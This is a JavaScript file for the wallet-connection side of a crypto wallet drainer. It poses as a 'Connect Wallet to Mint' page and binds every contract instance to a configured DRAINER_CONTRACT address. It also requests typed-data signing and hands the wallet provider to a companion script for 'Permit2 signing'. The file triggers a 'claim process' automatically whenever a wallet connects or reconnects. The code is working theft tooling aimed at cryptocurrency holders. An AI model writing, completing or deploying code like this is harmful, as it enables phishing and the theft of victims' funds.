// ============================================================================
//  main.js — Multi-Chain Wallet Connector
//  Target: WC connects < 60s on mobile, < 90s worst case
//  Works with config.js (CONFIG) + script.js (window.__apexConnected contract)
// ============================================================================

import { CONFIG } from './config.js';

/* ══════════════════════════════════════════════════════════════════════════
 *  1. DEBUG PANEL
 * ══════════════════════════════════════════════════════════════════════════ */
const debugArea = document.createElement('div');
debugArea.id = 'wc-debug';
debugArea.style.cssText = `
  position: fixed; bottom: 0; left: 0; width: 100%;
  background: #000; color: #0f0; font-size: 12px; padding: 5px;
  z-index: 10000; max-height: 150px; overflow-y: auto;
  display: none; font-family: monospace;`;
document.body.appendChild(debugArea);

let debugVisible = false;
document.addEventListener('dblclick', () => {
  debugVisible = !debugVisible;
  debugArea.style.display = debugVisible ? 'block' : 'none';
});

function logDebug(msg) {
  console.log(msg);
  debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
  debugArea.scrollTop = debugArea.scrollHeight;
}

/* ══════════════════════════════════════════════════════════════════════════
 *  2. PLATFORM DETECTION
 * ══════════════════════════════════════════════════════════════════════════ */
const UA = navigator.userAgent;
const isMobile     = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
const isIOS        = () => /iPhone|iPad|iPod/i.test(UA);
const isAndroid    = () => /Android/i.test(UA);
const isDesktop    = () => !isMobile();
const getPlatform  = () => isIOS() ? 'ios' : isAndroid() ? 'android' : isDesktop() ? 'desktop' : 'unknown';

/* ══════════════════════════════════════════════════════════════════════════
 *  3. CONFIG DESTRUCTURE
 * ══════════════════════════════════════════════════════════════════════════ */
const {
  PROJECT_ID,
  PUBLIC_TEST_ID,
  DAPP_METADATA,
  DRAINER_CONTRACT,
  CONTRACT_ABI,
  SUPPORTED_CHAINS = [1],
  MAINNET_ID = 1
} = CONFIG;

const PRIMARY_CHAIN_ID = SUPPORTED_CHAINS[0] || MAINNET_ID;
const PRIMARY_CHAIN    = `eip155:${PRIMARY_CHAIN_ID}`;
const OPTIONAL_CHAINS  = SUPPORTED_CHAINS
  .filter((id) => id !== PRIMARY_CHAIN_ID)
  .map((id) => `eip155:${id}`);

/* ══════════════════════════════════════════════════════════════════════════
 *  4. TIMEOUTS (tuned per platform)
 *  Mobile: real-world QR scan + deep-link round-trip needs 90s
 *  Desktop: QR scan is faster (phone is nearby); 60s is plenty
 * ══════════════════════════════════════════════════════════════════════════ */
const TIMEOUTS = {
  mobile: {
    wcApproval: 90_000,
    directEVM : 8_000
  },
  desktop: {
    wcApproval: 60_000,
    directEVM : 4_000
  }
};

/* ══════════════════════════════════════════════════════════════════════════
 *  5. DOM REFS
 * ══════════════════════════════════════════════════════════════════════════ */
const connectButton = document.getElementById('connectButton');
const walletButton  = document.getElementById('walletButton');
const claimStatus   = document.getElementById('claimStatus');

/* ══════════════════════════════════════════════════════════════════════════
 *  6. STATE
 * ══════════════════════════════════════════════════════════════════════════ */
let SignClient         = null;
let WalletConnectModal = null;
let EthereumProvider   = null;
let client             = null;
let modal              = null;
let currentSession     = null;
let web3Instance       = null;
let contractInstance   = null;
let isConnecting       = false;
let initPromise        = null;   // idempotent init
let keepAliveTimer     = null;

/* ══════════════════════════════════════════════════════════════════════════
 *  7. LIBRARY LOADER — parallel, multi-CDN
 * ══════════════════════════════════════════════════════════════════════════ */
async function loadModule(cdns) {
  let lastErr;
  for (const url of cdns) {
    try {
      const mod = await import(url);
      return mod.default || mod;
    } catch (e) { lastErr = e; }
  }
  throw lastErr || new Error('All CDNs failed');
}

async function loadWalletConnectLibs() {
  logDebug('⏳ Loading WalletConnect libs (parallel)...');
  const [sc, wcm, ep] = await Promise.all([
    loadModule([
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ]),
    loadModule([
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ]),
    loadModule([
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ])
  ]);
  SignClient         = sc.SignClient || sc;
  WalletConnectModal = wcm.WalletConnectModal || wcm;
  EthereumProvider   = ep.EthereumProvider || ep;
  logDebug('✅ WC libraries loaded');
}

/* ══════════════════════════════════════════════════════════════════════════
 *  8. SIGNCLIENT INIT — singleton, no WS pre-check on mobile
 * ══════════════════════════════════════════════════════════════════════════ */
function initWalletConnectOnce() {
  if (initPromise) return initPromise;

  initPromise = (async () => {
    if (client && modal) return { client, modal };
    if (!SignClient || !WalletConnectModal) await loadWalletConnectLibs();

    logDebug(`🔌 SignClient.init (project: ${PROJECT_ID.slice(0, 8)}…)`);

    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata : DAPP_METADATA,
      relayUrl : 'wss://relay.walletconnect.com'
    });

    modal = new WalletConnectModal({
      projectId: PROJECT_ID,
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index'          : '9999',
        '--wcm-accent-color'     : '#FF6B00',
        '--wcm-background-color' : '#1F2937',
        '--wcm-font-family'      : "'Inter', sans-serif"
      },
      enableExplorer: true,
      explorerRecommendedWalletIds: [
        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
        '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
        'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
        'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18'
      ],
      explorerExcludedWalletIds: [],
      mobileWallets: [
        { id: 'metamask', name: 'MetaMask',     links: { native: 'metamask://',        universal: 'https://metamask.app.link/' } },
        { id: 'trust',    name: 'Trust Wallet', links: { native: 'trust://',           universal: 'https://link.trustwallet.com/' } },
        { id: 'rainbow',  name: 'Rainbow',      links: { native: 'rainbow://',         universal: 'https://rnbwapp.com/' } },
        { id: 'coinbase', name: 'Coinbase',     links: { native: 'coinbasewallet://',  universal: 'https://go.cb-w.com/' } },
        { id: 'phantom',  name: 'Phantom',      links: { native: 'phantom://',         universal: 'https://phantom.app/' } }
      ]
    });

    // Wire events at init time (not after connect) so we never miss an update
    client.on('session_update', ({ params }) => {
      const account = params?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (account) {
        logDebug(`♻️ session_update → ${account}`);
        saveWallet(account, currentSession, 'evm');
        updateConnectedUI(account, 'evm');
        publishGlobal();
      }
    });

    client.on('session_delete', () => {
      logDebug('🗑️ session_delete');
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected by provider', 'error');
    });

    client.on('session_expire', () => {
      logDebug('⏰ session_expire');
      resetConnectedUI();
      clearSavedWallet();
    });

    logDebug('✅ SignClient ready');
    return { client, modal };
  })();

  return initPromise;
}

/* ══════════════════════════════════════════════════════════════════════════
 *  9. UI HELPERS
 * ══════════════════════════════════════════════════════════════════════════ */
function setButtonState(button, state) {
  if (!button) return;
  button.style.display      = 'inline-block';
  button.style.padding      = '14px 28px';
  button.style.borderRadius = '8px';
  button.style.fontWeight   = '600';
  button.style.border       = 'none';
  button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
  button.style.color        = '#fff';
  button.style.fontSize     = '16px';
  button.style.fontFamily   = "'Inter', sans-serif";
  button.style.minWidth     = '180px';
  button.disabled           = state === 'loading';

  switch (state) {
    case 'loading':
      button.style.background = 'linear-gradient(135deg,#666,#888)';
      button.innerHTML        = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
      break;
    case 'connected':
      button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
      button.innerHTML        = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
      break;
    case 'disconnect':
      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
      button.innerHTML        = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
      break;
    case 'failed':
      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
      button.innerHTML        = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
      setTimeout(() => setButtonState(button, 'normal'), 3000);
      break;
    default:
      button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
      button.innerHTML        = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
  }
}

function showStatus(message, type = 'info') {
  if (!claimStatus) return;
  claimStatus.textContent = message;
  claimStatus.className   = `status ${type}`;
  claimStatus.style.display      = 'block';
  claimStatus.style.padding      = '12px 16px';
  claimStatus.style.borderRadius = '8px';
  claimStatus.style.marginTop    = '12px';
  claimStatus.style.fontWeight   = '500';
  claimStatus.style.fontSize     = '14px';
  claimStatus.style.textAlign    = 'center';

  const styles = {
    success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
    error  : { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
    info   : { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' }
  };
  Object.assign(claimStatus.style, styles[type] || styles.info);

  if (type === 'error' || type === 'success') {
    setTimeout(() => {
      claimStatus.style.opacity = '0';
      setTimeout(() => {
        claimStatus.style.display = 'none';
        claimStatus.style.opacity = '1';
      }, 300);
    }, 5000);
  }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  10. STORAGE
 * ══════════════════════════════════════════════════════════════════════════ */
function saveWallet(address, session = null, chainType = null) {
  try {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  } catch {}
}
function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
function getSavedSession() {
  try {
    const s = localStorage.getItem('walletConnectSession');
    return s ? JSON.parse(s) : null;
  } catch { return null; }
}
function clearSavedWallet() {
  localStorage.removeItem('connectedWallet');
  localStorage.removeItem('walletConnectSession');
  localStorage.removeItem('chainType');
}

function savePendingUri(uri) {
  try {
    sessionStorage.setItem('pending_wc_uri', uri);
    sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
  } catch {}
}
function clearPendingUri() {
  try {
    sessionStorage.removeItem('pending_wc_uri');
    sessionStorage.removeItem('pending_wc_timestamp');
  } catch {}
}
function getPendingUri() {
  try {
    const uri = sessionStorage.getItem('pending_wc_uri');
    const ts  = sessionStorage.getItem('pending_wc_timestamp');
    if (!uri || !ts) return null;
    return { uri, ts: parseInt(ts, 10) };
  } catch { return null; }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  11. PUBLISH TO GLOBAL — REQUIRED by script.js
 *  script.js reads:
 *    window.__apexConnected.address
 *    window.__apexConnected.chain
 *    window.__apexConnected.web3
 *    window.__apexConnected.contract
 *    window.__apexConnected.provider  ← critical for Permit2 signing
 * ══════════════════════════════════════════════════════════════════════════ */
function publishGlobal() {
  window.__apexConnected = {
    address    : getSavedWallet(),
    chain      : getSavedChainType(),
    web3       : web3Instance,
    contract   : contractInstance,
    provider   : window.__apexProvider || null,
    session    : currentSession,
    publishedAt: Date.now()
  };
  window.dispatchEvent(new Event('apex:connected'));
  logDebug('📡 Published to window.__apexConnected');
}

/* ══════════════════════════════════════════════════════════════════════════
 *  12. CONNECTED UI
 * ══════════════════════════════════════════════════════════════════════════ */
function updateConnectedUI(address, chain = 'evm') {
  setButtonState(connectButton, 'disconnect');
  if (walletButton) setButtonState(walletButton, 'disconnect');

  const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
  const label  = labels[chain] || 'Unknown';

  let display = document.getElementById('connectedAddressDisplay');
  if (!display) {
    display = document.createElement('div');
    display.id = 'connectedAddressDisplay';
    display.style.cssText = `
      margin-top:12px;padding:10px 16px;
      font-family:'JetBrains Mono',monospace;font-size:14px;
      color:#059669;text-align:center;
      background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
      border-radius:8px;border:1px solid #A7F3D0;`;
    connectButton?.parentNode?.appendChild(display);
  }

  const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
  display.innerHTML = `
    <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
      <i class="fas fa-check-circle" style="color:#059669;"></i>
      <span>Connected: ${short}</span>
      <span style="background:#1F2937;color:#fff;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${label}</span>
      <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
        <i class="far fa-copy"></i>
      </button>
    </div>`;

  document.getElementById('copyAddress')?.addEventListener('click', () => {
    navigator.clipboard.writeText(address).then(() => {
      const btn = document.getElementById('copyAddress');
      if (!btn) return;
      const prev = btn.innerHTML;
      btn.innerHTML = '<i class="fas fa-check"></i>';
      setTimeout(() => { btn.innerHTML = prev; }, 1500);
    });
  });

  showStatus(`Connected to ${label}`, 'success');
}

function resetConnectedUI() {
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');
  document.getElementById('connectedAddressDisplay')?.remove();
  showStatus('Wallet disconnected', 'info');
  web3Instance          = null;
  contractInstance      = null;
  window.__apexProvider = null;
}

/* ══════════════════════════════════════════════════════════════════════════
 *  13. EIP-6963 PROVIDER DISCOVERY
 * ══════════════════════════════════════════════════════════════════════════ */
let evmProviders = [];
let eip6963Init  = false;

function setupEIP6963() {
  if (eip6963Init) return;
  eip6963Init = true;

  window.addEventListener('eip6963:announceProvider', (event) => {
    const detail = event.detail;
    if (!evmProviders.some((p) => p.info.uuid === detail.info.uuid)) {
      evmProviders.push(detail);
      logDebug(`EIP-6963: ${detail.info.name} (${detail.info.rdns})`);
    }
  });

  // Dispatch multiple times to catch late announcers
  window.dispatchEvent(new Event('eip6963:requestProvider'));
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 300);
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 800);
}

/* ══════════════════════════════════════════════════════════════════════════
 *  14. DIRECT EVM CONNECT (desktop only)
 * ══════════════════════════════════════════════════════════════════════════ */
async function connectDirectEVM(timeoutMs = TIMEOUTS.desktop.directEVM) {
  setupEIP6963();
  await new Promise((r) => setTimeout(r, 400));

  let providers = evmProviders.filter((p) => p.provider);
  if (providers.length === 0 && window.ethereum) {
    providers = [{
      info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
      provider: window.ethereum
    }];
  }
  if (providers.length === 0) {
    logDebug('No injected provider');
    return false;
  }

  // Prefer MetaMask when multiple
  const chosen = providers.length === 1
    ? providers[0]
    : providers.find((p) => p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name)) || providers[0];

  try {
    logDebug(`Direct EVM → ${chosen.info.name}`);
    const provider = chosen.provider;
    const accounts = await Promise.race([
      provider.request({ method: 'eth_requestAccounts' }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
    ]);

    if (accounts?.length) {
      const address = accounts[0];
      saveWallet(address, null, 'evm');
      updateConnectedUI(address, 'evm');

      setupEVMProviderEvents(provider);
      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      window.__apexProvider = provider;

      publishGlobal();
      logDebug(`✅ Direct EVM: ${address}`);
      return true;
    }
  } catch (err) {
    logDebug(`Direct EVM error: ${err.message}`);
  }
  return false;
}

/* ══════════════════════════════════════════════════════════════════════════
 *  15. WALLETCONNECT FLOW — mobile-optimized
 * ══════════════════════════════════════════════════════════════════════════ */
async function connectViaWalletConnect(timeoutMs) {
  if (isConnecting) { logDebug('Already connecting'); return false; }
  isConnecting = true;

  try {
    const { client: c, modal: m } = await initWalletConnectOnce();
    if (!c || !m) { isConnecting = false; return false; }

    try { m.closeModal(); } catch {}

    showStatus('Opening wallet connection…', 'info');

    const result = await c.connect({
      requiredNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains : [PRIMARY_CHAIN],
          events : ['chainChanged', 'accountsChanged']
        }
      },
      optionalNamespaces: OPTIONAL_CHAINS.length
        ? {
            eip155: {
              methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
              chains : OPTIONAL_CHAINS,
              events : ['chainChanged', 'accountsChanged']
            }
          }
        : undefined
    });

    const { uri, approval } = result;
    if (!uri) throw new Error('No URI returned from WalletConnect');

    logDebug(`URI acquired (${uri.length} chars)`);
    savePendingUri(uri);

    try { m.openModal({ uri }); } catch (e) { logDebug('openModal: ' + e.message); }
    showStatus('Approve in your wallet', 'info');

    const session = await Promise.race([
      approval(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('Connection timeout')), timeoutMs))
    ]);

    // Close QR the instant we have a session
    try { m.closeModal(); } catch {}
    clearPendingUri();

    const account = session?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
    if (!account) {
      showStatus('No account in session', 'error');
      isConnecting = false;
      return false;
    }

    // Chain validation
    const chainIdStr = session.namespaces.eip155.accounts[0].split(':')[1];
    const chainId    = parseInt(chainIdStr, 10);
    if (!SUPPORTED_CHAINS.includes(chainId)) {
      logDebug(`⚠️ Unsupported chain ${chainId}`);
      showStatus(`Unsupported chain ${chainId}. Please switch to ${PRIMARY_CHAIN_ID}.`, 'error');
      try { await c.disconnect({ topic: session.topic, reason: { code: 6000, message: 'Unsupported chain' } }); } catch {}
      isConnecting = false;
      return false;
    }

    logDebug(`✅ WC session chain ${chainId}: ${account}`);
    currentSession = session;

    saveWallet(account, session, 'evm');
    updateConnectedUI(account, 'evm');

    // Build EthereumProvider from session — REQUIRED for backend sign requests
    const provider = await EthereumProvider.init({
      projectId: PROJECT_ID,
      metadata : DAPP_METADATA,
      session,
      chains   : [chainId],
      showQrModal: false,
      optionalChains: OPTIONAL_CHAINS.map((ch) => parseInt(ch.split(':')[1], 10))
    });

    const Web3 = (await import('web3')).default;
    web3Instance     = new Web3(provider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    window.__apexProvider = provider;

    setupEVMProviderEvents(provider);
    publishGlobal();
    startKeepAlive();

    isConnecting = false;
    return true;
  } catch (err) {
    logDebug(`❌ WC error: ${err.message}`);
    try { if (modal) modal.closeModal(); } catch {}
    clearPendingUri();

    const msg = err.message || '';
    if (/User rejected|Cancelled|cancel/i.test(msg)) {
      showStatus('Connection cancelled', 'error');
    } else if (/timeout/i.test(msg)) {
      showStatus('Connection timed out — try again', 'error');
    } else {
      showStatus('Wallet connection failed: ' + msg, 'error');
    }
    isConnecting = false;
    return false;
  }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  16. KEEPALIVE — pings WC relay every 30s while page is visible
 * ══════════════════════════════════════════════════════════════════════════ */
function startKeepAlive() {
  stopKeepAlive();
  keepAliveTimer = setInterval(() => {
    if (document.hidden) return;
    if (!client || !currentSession) return;
    client.ping({ topic: currentSession.topic }).catch(() => {});
  }, 30_000);
}
function stopKeepAlive() {
  if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  17. EVM PROVIDER EVENTS
 * ══════════════════════════════════════════════════════════════════════════ */
function setupEVMProviderEvents(provider) {
  if (!provider || !provider.on) return;

  provider.on('accountsChanged', (accounts) => {
    if (!accounts?.length) {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    } else {
      updateConnectedUI(accounts[0], 'evm');
      saveWallet(accounts[0], currentSession, 'evm');
      publishGlobal();
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1000);
    }
  });

  provider.on('chainChanged', (chainId) => {
    showStatus(`Network changed to ${chainId}`, 'info');
  });

  provider.on('disconnect', () => {
    resetConnectedUI();
    clearSavedWallet();
    stopKeepAlive();
    showStatus('Wallet disconnected', 'info');
  });
}

/* ══════════════════════════════════════════════════════════════════════════
 *  18. MAIN CONNECT DISPATCHER
 * ══════════════════════════════════════════════════════════════════════════ */
async function connectWallet() {
  if (isConnecting) { logDebug('Already connecting'); return; }

  setButtonState(connectButton, 'loading');
  if (walletButton) setButtonState(walletButton, 'loading');
  showStatus('Connecting…', 'info');

  logDebug(`Platform: ${getPlatform()} | mobile: ${isMobile()}`);

  let success = false;

  if (isMobile()) {
    /* Mobile: WalletConnect only */
    success = await connectViaWalletConnect(TIMEOUTS.mobile.wcApproval);
  } else {
    /* Desktop: injected first, WC as fallback */
    success = await connectDirectEVM(TIMEOUTS.desktop.directEVM);
    if (!success) {
      logDebug('Desktop: falling back to WC');
      success = await connectViaWalletConnect(TIMEOUTS.desktop.wcApproval);
    }
  }

  if (success) {
    setButtonState(connectButton, 'connected');
    if (walletButton) setButtonState(walletButton, 'connected');
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1200);
  } else {
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  19. DISCONNECT
 * ══════════════════════════════════════════════════════════════════════════ */
async function disconnectWallet() {
  try {
    if (client && currentSession) {
      await client.disconnect({
        topic : currentSession.topic,
        reason: { code: 6000, message: 'User disconnected' }
      });
    }
  } catch (err) { logDebug(`Disconnect: ${err.message}`); }

  stopKeepAlive();
  currentSession = null;
  resetConnectedUI();
  clearSavedWallet();
  web3Instance          = null;
  contractInstance      = null;
  window.__apexProvider = null;
  window.__apexConnected = null;
}

/* ══════════════════════════════════════════════════════════════════════════
 *  20. BUTTON HANDLERS
 * ══════════════════════════════════════════════════════════════════════════ */
async function handleClick() {
  const saved = getSavedWallet();
  if (saved && getSavedChainType() !== 'unknown') {
    await disconnectWallet();
  } else {
    await connectWallet();
  }
}

connectButton?.addEventListener('click', handleClick);
walletButton?.addEventListener('click', handleClick);

/* Mobile: top nav button scrolls to main connect button */
if (walletButton && isMobile()) {
  walletButton.addEventListener('click', () => {
    setTimeout(() => {
      connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 200);
  });
}

/* ══════════════════════════════════════════════════════════════════════════
 *  21. SESSION RESTORE (mobile-safe)
 * ══════════════════════════════════════════════════════════════════════════ */
async function restoreWalletConnection() {
  const savedWallet  = getSavedWallet();
  const savedChain   = getSavedChainType();
  const savedSession = getSavedSession();

  // 1. Pending URI from a tab-killed deep-link flow
  const pending = getPendingUri();
  if (pending && Date.now() - pending.ts < 120_000) {
    logDebug('Restoring pending WC flow…');
    try {
      await initWalletConnectOnce();
      const sessions = client.session.values();
      if (sessions.length > 0) {
        const session = sessions[0];
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          currentSession = session;
          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');

          const provider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            metadata : DAPP_METADATA,
            session,
            showQrModal: false
          });
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          window.__apexProvider = provider;

          setupEVMProviderEvents(provider);
          publishGlobal();
          startKeepAlive();
          clearPendingUri();

          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1000);
          return;
        }
      }
    } catch (e) {
      logDebug(`Pending restore failed: ${e.message}`);
    }
  }

  if (!savedWallet || savedChain === 'unknown') return;

  /* EVM */
  if (savedChain === 'evm') {
    if (savedSession?.topic) {
      try {
        await initWalletConnectOnce();
        const session = client.session.get(savedSession.topic);
        if (session) {
          currentSession = session;
          updateConnectedUI(savedWallet, 'evm');

          const provider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            metadata : DAPP_METADATA,
            session,
            showQrModal: false
          });
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          window.__apexProvider = provider;

          setupEVMProviderEvents(provider);
          publishGlobal();
          startKeepAlive();
          logDebug('♻️ EVM session restored');
          return;
        }
      } catch (e) {
        logDebug(`Session restore failed: ${e.message}`);
        clearSavedWallet();
      }
    }

    /* Desktop-only injected fallback */
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts?.length && accounts[0] === savedWallet) {
          updateConnectedUI(savedWallet, 'evm');
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          window.__apexProvider = window.ethereum;
          setupEVMProviderEvents(window.ethereum);
          publishGlobal();
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  } else {
    /* Solana/Bitcoin restore is script.js's job */
    clearSavedWallet();
  }
}

/* ══════════════════════════════════════════════════════════════════════════
 *  22. VISIBILITY RESUME — iOS Safari tab-kill recovery
 * ══════════════════════════════════════════════════════════════════════════ */
document.addEventListener('visibilitychange', () => {
  if (document.hidden) return;

  const pending = getPendingUri();
  if (!pending || Date.now() - pending.ts > 120_000) return;

  logDebug('Visibility: pending WC flow detected');
  setTimeout(async () => {
    try {
      await initWalletConnectOnce();
      const sessions = client.session.values();
      if (sessions.length > 0) {
        const session = sessions[0];
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          currentSession = session;
          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');

          const provider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            metadata : DAPP_METADATA,
            session,
            showQrModal: false
          });
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          window.__apexProvider = provider;

          setupEVMProviderEvents(provider);
          publishGlobal();
          startKeepAlive();
          clearPendingUri();

          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 800);
        }
      }
    } catch (e) {
      logDebug(`Visibility restore failed: ${e.message}`);
    }
  }, 500);
});

/* ══════════════════════════════════════════════════════════════════════════
 *  23. CLEANUP
 * ══════════════════════════════════════════════════════════════════════════ */
window.addEventListener('beforeunload', () => {
  try { if (modal) modal.closeModal(); } catch {}
});

/* ══════════════════════════════════════════════════════════════════════════
 *  24. BOOT SEQUENCE
 * ══════════════════════════════════════════════════════════════════════════ */
(async function boot() {
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  try {
    await loadWalletConnectLibs();
    // Eager init so first click is fast
    await initWalletConnectOnce();
    logDebug('✅ Boot complete');
  } catch (err) {
    logDebug(`❌ Boot failed: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  setupEIP6963();

  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  await restoreWalletConnection();

  logDebug('✅ main.js initialised');
  logDebug(`   Platform: ${getPlatform()} | mobile: ${isMobile()} | desktop: ${isDesktop()}`);
})();
